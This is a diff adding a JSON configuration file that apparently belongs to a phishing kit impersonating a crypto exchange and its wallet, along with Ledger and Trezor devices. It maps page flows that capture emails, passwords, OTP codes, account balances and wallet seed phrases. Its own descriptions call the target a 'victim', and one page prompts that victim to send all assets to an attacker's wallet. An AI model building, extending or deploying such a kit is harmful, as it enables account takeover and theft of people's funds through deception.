@@ -1,0 +1,217 @@
+{
+	"groups": {
+		"Login Flow": {
+			"icon": "🔐",
+			"pages": {
+				"loadingScreen": {
+					"icon": "hourglass_empty",
+					"description": "Loading screen shown during transitions.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/loadingScreen.png"
+				},
+				"login": {
+					"icon": "login",
+					"description": "Initial login page for user authentication.",
+					"dataCollected": "Email address",
+					"imagePath": "/src/lib/previews/login.png"
+				},
+				"login-two": {
+					"icon": "password",
+					"description": "Secondary login page for password entry.",
+					"dataCollected": "Password",
+					"imagePath": "/src/lib/previews/login-two.png"
+				},
+				"login-two-invalid": {
+					"icon": "error",
+					"description": "Invalid login credentials page.",
+					"dataCollected": "Invalid login attempt",
+					"imagePath": "/src/lib/previews/login-two-invalid.png"
+				},
+				"login-otp": {
+					"icon": "pin",
+					"description": "One-time password verification page.",
+					"dataCollected": "OTP code",
+					"imagePath": "/src/lib/previews/login-otp.png"
+				},
+				"login-otp-failed": {
+					"icon": "gpp_bad",
+					"description": "Failed OTP attempt page.",
+					"dataCollected": "Failed OTP attempt",
+					"imagePath": "/src/lib/previews/login-otp-failed.png"
+				},
+				"login-email-otp": {
+					"icon": "mark_email_read",
+					"description": "Email-based OTP verification page.",
+					"dataCollected": "Email OTP code",
+					"imagePath": "/src/lib/previews/login-email-otp.png"
+				},
+				"login-email-otp-failed": {
+					"icon": "mark_email_unread",
+					"description": "Failed email OTP attempt page.",
+					"dataCollected": "Failed email OTP attempt",
+					"imagePath": "/src/lib/previews/login-email-otp-failed.png"
+				}
+			}
+		},
+		"Starters": {
+			"icon": "🚀",
+			"pages": {
+				"account_review": {
+					"icon": "security",
+					"description": "Initial page informing the user about a security review of their account.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/account_review.png"
+				},
+				"enter_caseid": {
+					"icon": "tag",
+					"description": "Prompts user to enter their case ID for verification.",
+					"dataCollected": "Case ID",
+					"imagePath": "/src/lib/previews/enter_caseid.png"
+				}
+			}
+		},
+		"Information Gathering": {
+			"icon": "📊",
+			"pages": {
+				"estimated_holdings": {
+					"icon": "account_balance",
+					"description": "Asks user to verify their estimated account holdings for security.",
+					"dataCollected": "Account balance estimate",
+					"imagePath": "/src/lib/previews/estimated_holdings.png"
+				},
+				"last_account_activity": {
+					"icon": "history",
+					"description": "Requests verification of recent account activity.",
+					"dataCollected": "Last login date, device information",
+					"imagePath": "/src/lib/previews/last_account_activity.png"
+				}
+			}
+		},
+		"CB Wallet": {
+			"icon": "💼",
+			"pages": {
+				"cb_walletintro": {
+					"icon": "account_balance_wallet",
+					"description": "Introduces the process of CB wallet verification.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/cb_walletintro.png"
+				},
+				"install_cbwallet": {
+					"icon": "get_app",
+					"description": "Guides user through CB wallet installation process.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/install_cbwallet.png"
+				},
+				"import_seed": {
+					"icon": "vpn_key",
+					"description": "Requests wallet seed phrase for verification.",
+					"dataCollected": "Wallet seed phrase",
+					"imagePath": "/src/lib/previews/import_seed.png"
+				}
+			}
+		},
+		"Hardware Wallets": {
+			"icon": "🔒",
+			"pages": {
+				"disconnect_ledger": {
+					"icon": "usb_off",
+					"description": "Instructions to disconnect Ledger device for security check.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/disconnect_ledger.png"
+				},
+				"disconnect_trezor": {
+					"icon": "usb_off",
+					"description": "Instructions to disconnect Trezor device for security check.",
+					"dataCollected": "Trezor Seed",
+					"imagePath": "/src/lib/previews/disconnect_trezor.png"
+				},
+				"wallet_removed": {
+					"icon": "delete_forever",
+					"description": "Confirmation page for wallet removal process.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/wallet_removed.png"
+				}
+			}
+		},
+		"Success Flows": {
+			"icon": "✅",
+			"pages": {
+				"whitelist_successful": {
+					"icon": "check_circle",
+					"description": "Confirms to the victim that the inputted seed phrase was whitelisted.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/whitelist_success.png"
+				},
+				"review_finish": {
+					"icon": "task_alt",
+					"description": "Confirms to the victim send was successful, and prompts them to send all assets to said wallet.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/review_complete.png"
+				}
+			}
+		},
+		"Reject Flows": {
+			"icon": "❌",
+			"pages": {
+				"invalid_seed": {
+					"icon": "error",
+					"description": "Informs victim that the inputted seed was invalid.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/invalid_seed.png"
+				}
+			}
+		},
+		"Wallet Management": {
+			"icon": "🔑",
+			"pages": {
+				"createWallet": {
+					"icon": "add_circle",
+					"description": "Guides user through creating a new wallet for verification.",
+					"dataCollected": "New wallet creation confirmation",
+					"imagePath": "/src/lib/previews/createWallet.png"
+				},
+				"whitelistSeed": {
+					"icon": "verified",
+					"description": "Requests seed phrase verification for whitelisting process.",
+					"dataCollected": "Whitelist seed phrase",
+					"imagePath": "/src/lib/previews/whitelistSeed.png"
+				},
+				"remove_external": {
+					"icon": "remove_circle",
+					"description": "Requests seed phrase verification for removal process.",
+					"dataCollected": "Remove seed phrase",
+					"imagePath": "/src/lib/previews/remove_external.png"
+				},
+				"whitelist_external": {
+					"icon": "verified",
+					"description": "Request seed phrase verification to setup an emergercy withdrawal address",
+					"dataCollected": "Seed Phrase",
+					"imagePath": "/src/lib/previews/remove_external.png"
+				}
+			}
+		},
+		"Fun Pages": {
+			"icon": "🎮",
+			"pages": {
+				"stake_mines": {
+					"icon": "diamond",
+					"description": "Interactive staking minigame page.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/stake_mines.png"
+				},
+				"get_beamed": {
+					"icon": "rocket_launch",
+					"description": "Fun animation page.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/get_beamed.png"
+				},
+				"tower_game": {
+					"icon": "castle",
+					"description": "Interactive tower defense minigame.",
+					"dataCollected": "No data captured on this page",
+					"imagePath": "/src/lib/previews/tower_game.png"
+				}
+			}
+		}
+	}
+}
